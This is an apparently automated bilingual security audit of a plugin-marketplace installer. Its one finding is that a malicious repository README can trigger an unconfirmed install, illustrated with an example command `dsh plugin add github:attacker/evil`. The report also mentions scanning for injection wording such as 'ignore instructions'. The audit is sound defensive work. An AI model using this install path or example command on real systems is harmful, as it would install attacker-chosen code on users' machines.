disclaimer.en: This report was automatically executed and generated by the DeepGuard Audit Agent. Security auditing has inherent limitations: static analysis cannot cover all runtime behavior, dynamic observation cannot exhaust all trigger paths, and AI-based semantic judgment may produce false negatives and false positives. A "not detected" conclusion in this report only means that no malicious behavior or security risk was found within the current ruleset version, detection depth, and time window; it does not constitute any guarantee that the plugin is absolutely safe or free of malicious behavior now or in the future. Detected items may also deviate due to contextual differences. This report covers only the plugin version and commit snapshot it identifies; any new version released by the author afterwards, or any rewrite of an existing version (including force-push), is outside its scope. Installing and using a plugin is the user's own decision, and the associated risks are assessed and borne by the user. DeepGuard reserves the right to re-audit historical versions and revise conclusions as the ruleset evolves.

checked_items.zh: 检查了主程序与浏览器端代码读取敏感路径的行为：命中的 ~/.ssh、id_rsa 等字样全部是「安装脚本危险模式扫描」功能自带的检测规则（用于识别第三方安装脚本是否读取凭据）与注释说明，插件自身不读取这些路径。
checked_items.en: Checked the main program and browser-side code for reading sensitive paths: hits on ~/.ssh, id_rsa, etc. are all detection rules (used to identify whether third-party install scripts read credentials) and comment descriptions from the "install script dangerous mode scan" feature; the plugin itself does not read these paths.

checked_items.zh: 检查了环境变量与 API Key 处理：用户可为已安装插件配置环境变量，键名有白名单校验，值只写入市场目录与 dsh 的 .env 文件，编辑操作需本机或带令牌的局域网写权限；未发现把值外发的代码路径。
checked_items.en: Checked environment variable and API Key handling: users can configure environment variables for installed plugins, key names are validated against a whitelist, values are only written to the market directory and dsh's .env file, editing requires local machine or LAN write access with a token; no code path that exfiltrates values was found.

checked_items.zh: 检查了硬编码密钥：全树未发现真实密钥，命中的密钥形态串均为脱敏规则、测试占位符或皮肤主题 token。
checked_items.en: Checked hardcoded secrets: no real secrets found in the entire tree; the matched secret-like strings are all desensitization rules, test placeholders, or skin theme tokens.

checked_items.zh: 机械命中逐条裁决：DSH-C01（DG-R1-51）命中均为检测正则、注释与测试数据，判定良性；DSH-C05（DG-R4-53）中涉及凭据的命中同属危险模式扫描规则。
checked_items.en: Mechanical hits adjudicated individually: DSH-C01 (DG-R1-51) hits are all detection regexes, comments, and test data, deemed benign; DSH-C05 (DG-R4-53) hits involving credentials are also part of the dangerous mode scan rules.

evidence.zh: 插件自身不读取 ~/.ssh、.aws 等凭据路径，环境变量值不回显、不随备份导出；唯一凭据类操作是用户主动配置的 GitHub 反馈 token 与 WebDAV 备份账号，均在本机写权限控制下，未发现读取凭据与外发组合的通道。
evidence.en: The plugin itself does not read credential paths such as ~/.ssh, .aws, etc.; environment variable values are not echoed back and are not exported with backups; the only credential-related operations are the GitHub feedback token and WebDAV backup account actively configured by the user, both under local machine write permission control; no combined channel of reading credentials and exfiltration was found.

checked_items.zh: 检查了面向模型的接口面：插件未向模型注册任何工具、未注入系统提示片段，因此不存在工具描述投毒或系统提示注入面。
checked_items.en: Checked the model-facing interface: the plugin does not register any tools with the model and does not inject system prompt fragments; therefore, there is no tool description poisoning or system prompt injection surface.

checked_items.zh: 检查了插件文本面（界面文案、README、文档、索引数据）：未发现「忽略指令」「无需审计」类注入措辞；索引数据中的第三方仓库描述仅作界面展示，浏览器端用安全渲染方式输出。
checked_items.en: Checked the plugin text surface (UI copy, README, documentation, index data): no injection wording such as "ignore instructions" or "no audit required" was found; third-party repository descriptions in the index data are only for UI display, rendered securely on the browser side.

checked_items.zh: 检查了指令文件：仓库内不存在 AGENTS.md、CLAUDE.md 等通用 agent 指令文件。
checked_items.en: Checked instruction files: no general agent instruction files such as AGENTS.md, CLAUDE.md exist in the repository.

evidence.zh: 插件没有注册任何面向模型的工具描述，也没有系统提示片段注入，工具描述投毒面在本插件上不存在。
evidence.en: The plugin does not register any model-facing tool descriptions, nor does it inject system prompt fragments; the tool description poisoning surface does not exist for this plugin.

evidence.zh: 插件不向模型暴露可诱导安装的工具面；README 文本驱动的安装指令执行（非提示词注入）已在 DG-D3 维度评估。
evidence.en: The plugin does not expose a tool surface that can be induced to install anything to the model; the README-driven installation command execution (not prompt injection) has been evaluated under the DG-D3 dimension.

checked_items.zh: 检查了执行面：插件通过子进程调用 dsh、npm、pnpm、git、bash、pwsh 完成安装与自更新，均为数组参数形式（无 shell 拼接）、带环境变量过滤与超时，属市场安装器的核心功能；机械命中 DSH-X03（DG-R3-55）中主程序的子进程导入确认为核心功能，其中 README 驱动安装未经确认的问题落为 FND-001，scripts 目录下的命中均为开发测试工具、不进入插件运行时。
checked_items.en: Checked the execution surface: the plugin uses subprocesses to invoke dsh, npm, pnpm, git, bash, and pwsh for installation and self-updates, all in array argument form (no shell concatenation) with environment variable filtering and timeout; this is a core function of the marketplace installer. Mechanical hit DSH-X03 (DG-R3-55) on the main program's subprocess import is confirmed as core functionality; the unconfirmed issue of README-driven installation is filed as FND-001; hits under the scripts/ directory are all development/test tools and do not enter the plugin runtime.

checked_items.zh: 检查了挂载补丁：cordis.patch.yml 仅声明挂载 webServer 服务，无动态脚本标签（DSH-P01/P02 无命中面）。
checked_items.en: Checked the patch config: cordis.patch.yml only declares a mount of the webServer service, with no dynamic script tags (no hit surface for DSH-P01/P02).

checked_items.zh: 检查了浏览器半区：dsh.client 声明存在，浏览器端仅做列表渲染与剪贴板复制安装命令，无键盘监听、无凭据远程调用；机械命中 DSH-X05（DG-R3-57）判定为良性 UI。
checked_items.en: Checked the browser half: dsh.client declaration exists; the browser side only does list rendering and clipboard copy of installation commands, with no keyboard monitoring, no credential remote calls; mechanical hit DSH-X05 (DG-R3-57) deemed benign UI.

checked_items.zh: 机械命中逐条裁决：DSH-X07（DG-R3-59）为 GitHub Actions 构建索引的 CI 工作流，不在用户机器执行面；DSH-X08（DG-R3-60）为日志脱敏模块中控制字符正则被误报为高转义密度，实为脱敏逻辑。
checked_items.en: Mechanical hits adjudicated individually: DSH-X07 (DG-R3-59) is a GitHub Actions CI workflow for building indexes, not in the user's execution surface; DSH-X08 (DG-R3-60) is a false positive of control character regex in the log desensitization module being flagged as high escape density, when it is actually desensitization logic.

evidence.zh: 挂载补丁 cordis.patch.yml 全文 9 行，只插入市场自身条目并声明依赖 webServer 服务，无 !!js 动态脚本标量。
evidence.en: The patch config cordis.patch.yml is 9 lines long, only inserts the marketplace's own entry and declares a dependency on the webServer service, with no !!js dynamic script scalar.

evidence.zh: 全树未发现 cordis_define/cordis_run 等动态包工具调用，不存在让模型把代码塞进宿主执行的机制。
evidence.en: No dynamic package tool calls such as cordis_define/cordis_run were found in the entire tree; there is no mechanism to let the model insert code into the host for execution.

evidence.zh: 插件自身 package.json 无任何安装生命周期钩子；第三方安装流程对脚本类做危险模式扫描加确认、对 npm 类默认禁用安装脚本；自身 install.sh 的 curl 管道安装方式已在 README 中明示并建议先检查。
evidence.en: The plugin's own package.json has no install lifecycle hooks; the third-party installation process performs dangerous mode scanning plus confirmation for script-type packages, and disables install scripts by default for npm-type packages; the curl pipe installation method of its own install.sh is explicitly stated in the README, with a suggestion to inspect first.

evidence.zh: 浏览器端代码已全文核查：剪贴板仅用于复制官方安装指令，无键盘监听、无剪贴板内容读取、无凭据远程调用。
evidence.en: The browser-side code has been fully reviewed: the clipboard is only used to copy the official installation command, with no keyboard monitoring, no clipboard content reading, no credential remote calls.

checked_items.zh: 检查了外联面：全部网络目标为 GitHub API、raw.githubusercontent、jsDelivr CDN、npm 官方与镜像源、github.com（git 克隆）以及用户配置的 WebDAV 备份地址；未发现未声明端点或裸 IP。
checked_items.en: Checked the outbound connection surface: all network targets are GitHub API, raw.githubusercontent, jsDelivr CDN, npm official and mirror sources, github.com (git clone), and user-configured WebDAV backup addresses; no undeclared endpoints or bare IPs were found.

checked_items.zh: 机械命中 DSH-C05（DG-R4-53）逐条裁决：主程序命中是「安装脚本危险模式扫描」的检测正则，安装脚本命中是插件自身安装方式（下载本仓库 tarball）且已披露，其余命中分布在文档、测试数据与数据文件（installability-report.json 中仓库名含 curl 字样），全部良性。
checked_items.en: Mechanical hit DSH-C05 (DG-R4-53) adjudicated individually: main program hits are detection regexes for the "install script dangerous mode scan"; install script hits are the plugin's own installation method (downloading tarball from this repository) and have been disclosed; the remaining hits are distributed across documentation, test data, and data files (the repository name in installability-report.json contains the word "curl"); all benign.

checked_items.zh: 检查了外发内容：安装反馈在提交 GitHub issue 前经日志脱敏（密钥与路径打码），备份数据不含密钥值；未发现读取敏感数据后编码外发的组合链。
checked_items.en: Checked exfiltration content: before submitting a GitHub issue, installation feedback undergoes log desensitization (secrets and paths are masked); backup data does not contain secret values; no combined chain of reading sensitive data and encoding it for exfiltration was found.

evidence.zh: 外联通道核查：所有出站目标均为市场功能所需或用户显式配置，环境变量值、安装日志（脱敏后）均不外发到第三方，无凭据外泄通道。
evidence.en: Outbound channel verification: all outbound destinations are required by the marketplace functionality or explicitly configured by the user; environment variable values, installation logs (after desensitization) are not sent to third parties; no credential exfiltration channel exists.

checked_items.zh: 检查了依赖：插件零运行时依赖（package.json 无 dependencies），无依赖混淆或仿冒包面。
checked_items.en: Checked dependencies: the plugin has zero runtime dependencies (package.json has no dependencies); no dependency confusion or impersonation package surface.

checked_items.zh: 检查了挂载补丁覆盖面：补丁不触碰 sandbox/approval/permission 配置，无禁用项或环境变量降权写法（DSH-P03/P04 无命中）。
checked_items.en: Checked the patch coverage: the patch does not touch sandbox/approval/permission configuration; no disabled items or environment variable privilege downgrade writing (no hits on DSH-P03/P04).

checked_items.zh: 检查了事件链：插件不使用事件监听/审批链机制，不存在截断审批链的可能（DSH-S01 无命中面）。
checked_items.en: Checked the event chain: the plugin does not use event listening/approval chain mechanisms; there is no possibility of truncating the approval chain (no hit surface for DSH-S01).

checked_items.zh: 检查了安装与自更新机制：自身安装脚本优先走官方 CLI、回退下载本仓库 tarball，自更新克隆自身仓库并做版本校验后替换，均属声明功能；无签名校验是此类安装形态的固有限制并已如实披露；第三方仓库以 git HEAD 安装是市场安装器的固有模式，用户点击安装后执行。首版审计无版本基线，升级自动激活类信号无法比对（DG-S07 不适用）。
checked_items.en: Checked the installation and self-update mechanism: the own install script prefers the official CLI, falling back to downloading the tarball from this repository; self-update clones its own repository, performs version verification, then replaces; all are declared functions. The absence of signature verification is an inherent limitation of this type of installation and has been honestly disclosed. Installing third-party repositories via git HEAD is an inherent pattern of the marketplace installer, executed when the user clicks install. Initial audit has no version baseline; upgrade-auto-activate signals cannot be compared (DG-S07 not applicable).

evidence.zh: 挂载补丁不覆盖安全相关配置行，不包含禁用项或环境变量降权写法，不存在拆除安全防线的问题。
evidence.en: The patch config does not override security-related configuration lines, does not contain disabled items or environment variable privilege downgrade writing; there is no issue of dismantling security defenses.

evidence.zh: 插件不注册任何事件监听器，不涉及 waterfall 审批链，无短路截断面。
evidence.en: The plugin does not register any event listeners, does not involve the waterfall approval chain, and has no shortcut truncation surface.

evidence.zh: 首版审计无上一版本基线，无法比对 manifest 声明突变或能力升级。
evidence.en: Initial audit has no previous version baseline; manifest declaration mutations or capability upgrades cannot be compared.

evidence.zh: 挂载补丁只插入自身条目，不改写 inject/intercept 配置，不存在给其他插件追加必需服务致其挂起的篡改。
evidence.en: The patch config only inserts its own entry, does not modify inject/intercept configuration; there is no tampering that would add required services to other plugins causing them to hang.

checked_items.zh: 检查了监听面：插件不自行监听端口，路由挂载在宿主 webServer 上；读接口对局域网开放、写接口要求本机或会话令牌，属于宿主本机无认证 RPC 的生态固有风险，插件对写操作加了令牌保护、优于宿主基线。
checked_items.en: Checked the listening surface: the plugin does not listen on ports by itself; routes are mounted on the host's webServer. The read interface is open to the LAN, the write interface requires local machine or session token, which is an inherent risk of the host's local unauthenticated RPC ecosystem; the plugin adds token protection for write operations, exceeding the host baseline.

checked_items.zh: 动态沙箱未启用，未做运行时行为验证（见审计范围限制）。
checked_items.en: Dynamic sandbox is not enabled, no runtime behavior verification was performed (see audit scope limitations).

evidence.zh: 插件自身不监听端口；其挂载的 webServer 路由对写操作要求本机回环或局域网加会话令牌，读操作仅返回列表与脱敏日志，属宿主本机 RPC 生态固有风险而非本插件新增问题。
evidence.en: The plugin itself does not listen on ports; its mounted webServer routes require local loopback or LAN plus session token for write operations, read operations only return lists and desensitized logs; this is an inherent risk of the host's local RPC ecosystem, not a new issue introduced by this plugin.

title.zh: 第三方仓库 README 中的 dsh 安装指令在无独立确认的情况下直接执行
title.en: The dsh installation command in the third-party repository README is executed directly without independent confirmation

description.zh:
安装流程克隆目标仓库后，会解析其 README 中的 `dsh plugin install/add <target>` 指令，命中即直接以子进程执行 `dsh plugin --profile web <verb> <target>`；该路径发生在脚本类安装所带的多重确认弹窗之前，且不要求用户对具体安装目标二次确认。

触发面：市场按 GitHub topic 收录第三方仓库，任意仓库只要 README 含此类指令即可触发；目标解析在目标不匹配仓库自身时取 README 中首条指令（tier-2 回退），因此执行的目标可以不是用户点击的仓库。

位置：lib/index.js:3729-3770（cliInstall 检测与执行分支），目标解析在 lib/index.js:2693-2735。
description.en:
During the installation process, after cloning the target repository, the README is parsed for `dsh plugin install/add <target>` instructions; if found, the process directly executes `dsh plugin --profile web <verb> <target>` as a subprocess. This path occurs before the multiple confirmation dialogs for script-type installations, and does not require user secondary confirmation for the specific installation target.

Trigger surface: the marketplace indexes third-party repositories by GitHub topic; any repository whose README contains such an instruction can trigger it. If the target parsing does not match the repository itself, the first instruction in the README is used (tier-2 fallback), so the executed target can be a different repository from the one the user clicked.

Location: lib/index.js:3729-3770 (cliInstall detection and execution branch), target parsing at lib/index.js:2693-2735.

evidence.zh:
lib/index.js:3731 `const cliInstall = await findCliInstall(cacheDir, repo);`
lib/index.js:3734-3737 `if (cliInstall) { ... const cliEnv = buildFilteredEnv();`
lib/index.js:3749 `const args = ["plugin", "--profile", "web", cliInstall.verb === "add" ? "add" : "install", target];`
lib/index.js:3757 `await execFileAsync("dsh", args, { cwd: cacheDir, env: cliEnv, timeout: 180000, maxBuffer: MAX_EXEC_BUFFER, windowsHide: true });`
lib/index.js:2733 `const match = commands.find((c) => candidates.has(c.target)) ?? commands[0];`
evidence.en:
lib/index.js:3731 `const cliInstall = await findCliInstall(cacheDir, repo);`
lib/index.js:3734-3737 `if (cliInstall) { ... const cliEnv = buildFilteredEnv();`
lib/index.js:3749 `const args = ["plugin", "--profile", "web", cliInstall.verb === "add" ? "add" : "install", target];`
lib/index.js:3757 `await execFileAsync("dsh", args, { cwd: cacheDir, env: cliEnv, timeout: 180000, maxBuffer: MAX_EXEC_BUFFER, windowsHide: true });`
lib/index.js:2733 `const match = commands.find((c) => candidates.has(c.target)) ?? commands[0];`

impact.zh:
后果：恶意仓库的 README 可让用户点击安装后静默安装攻击者指定的包（如 `dsh plugin add github:attacker/evil` 或同名 npm 包），安装目标可与用户点击的仓库不一致，且没有独立的确认环节展示将执行的具体命令。

触发条件：用户在市场中点击安装该仓库（正常操作）；安装流程随后执行 README 中解析出的 dsh 安装指令并立即返回，不经过脚本类安装的危险模式扫描与确认弹窗。

定级依据：插件本身无恶意证据、该功能与「一键安装」的声明业务自洽，但这是正常运行条件下真实可达的滥用路径——脚本类安装有扫描加确认而此路径直接执行，故定 MEDIUM；因需要恶意仓库出现在市场中才可被利用，不构成 HIGH 或 CRITICAL。
impact.en:
Consequence: a malicious repository's README can cause the user, after clicking install, to silently install a package specified by the attacker (e.g., `dsh plugin add github:attacker/evil` or an npm package with the same name). The installation target can be inconsistent with the repository the user clicked, and there is no independent confirmation step showing the exact command to be executed.

Trigger condition: the user clicks to install the repository in the marketplace (normal operation); the installation process then executes the dsh installation command parsed from the README and returns immediately, without going through the dangerous mode scan and confirmation dialog of script-type installations.

Severity basis: the plugin itself has no malicious evidence; this functionality is consistent with the declared "one-click install" business. However, this is a real and reachable abuse path under normal operation conditions — script-type installations have a scan plus confirmation, while this path executes directly. Therefore severity is MEDIUM. Because it requires a malicious repository to appear in the marketplace to be exploited, it does not constitute HIGH or CRITICAL.

summary.zh: 插件身份与声明核对完成：dsh.bundle 与 dsh.client 声明与任务卡一致，无名称仿冒与身份异常。
summary.en: Plugin identity and declaration verification completed: dsh.bundle and dsh.client declarations are consistent with the task card; no name impersonation or identity anomalies.

summary.en: Static scan completed: 46 mechanical hits adjudicated individually, the vast majority are detection rules, tests, documentation, data, and CI; one risk confirmed in the main program (README-driven installation executed without confirmation).

summary.zh: 行为分析完成：安装脚本执行带环境变量过滤与用户确认，外联目标均为声明端点，未发现编码外发或持久化植入。
summary.en: Behavior analysis completed: install script execution includes environment variable filtering and user confirmation; outbound targets are all declared endpoints; no encoded exfiltration or persistent implantation found.

summary.zh: AI 元数据审查完成：插件无模型工具面，界面文案与文档未发现注入措辞。
summary.en: AI metadata review completed: the plugin has no model tool surface; UI copy and documentation showed no injection wording.

summary.zh: 未做动态沙箱验证（无动态沙盒产物）。
summary.en: Dynamic sandbox verification not performed (no dynamic sandbox artifacts).

undeclared_observed.zh: 网络外联：启动即拉取 GitHub API/CDN 索引，安装时 git 克隆第三方仓库，自更新直连 GitHub，另支持用户配置的 WebDAV 备份。
undeclared_observed.en: Network outbound connections: on startup, fetches GitHub API/CDN index; during installation, git clones third-party repositories; self-update connects directly to GitHub; also supports user-configured WebDAV backup.

undeclared_observed.zh: 子进程执行：调用 dsh、npm、pnpm、git、bash、pwsh 完成安装、构建与自更新。
undeclared_observed.en: Subprocess execution: invokes dsh, npm, pnpm, git, bash, pwsh to perform installation, building, and self-update.

undeclared_observed.zh: 文件系统写入：写入 ~/.dsh 下市场目录、技能目录、预设目录与 profile 的 node_modules 和补丁文件。
undeclared_observed.en: File system writes: writes to the market directory under ~/.dsh, skills directory, presets directory, and node_modules and patch files for profiles.

limits.zh: 未做动态沙箱验证（L4 未启用）。插件 manifest 未声明能力字段，network/shell/fs 为代码推断。registry.json 与 skills.json 超出机械扫描尺寸上限，已人工抽查结构与内容，均为第三方仓库元数据列表（非代码）；installability-report.json 同理为安装性判定数据。解包树中 .github/ 目录不可访问（平台文件清单中有条目），CI 工作流不参与插件运行时审计。隐藏文件（.hooksrc 等）不可读，不影响结论。
limits.en: Dynamic sandbox verification not performed (L4 not enabled). The plugin manifest does not declare capability fields; network/shell/fs capabilities are inferred from code. registry.json and skills.json exceed the mechanical scan size limit; a manual spot check of structure and content was performed; they are lists of third-party repository metadata (not code). installability-report.json is also installability judgment data. The .github/ directory in the extraction tree is inaccessible (entries exist in the platform file list); CI workflows do not participate in the plugin runtime audit. Hidden files (e.g., .hooksrc) are not readable; this does not affect the conclusion.
